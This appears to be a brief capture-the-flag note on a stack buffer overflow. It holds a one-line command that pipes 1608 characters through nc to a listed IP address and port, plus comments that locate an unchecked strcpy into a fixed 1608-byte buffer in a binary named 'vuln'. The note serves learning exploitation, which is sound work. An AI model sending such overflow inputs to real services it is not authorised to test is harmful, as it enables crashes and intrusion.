python -c "print('a'*1608)" | nc 129.241.200.165 2200

# Find the vulnerable code in "vuln"
# char local_658 [1608];  --> allocates space 
# strcpy(local_658, param); --> copies user input into allocated space - user can overflow

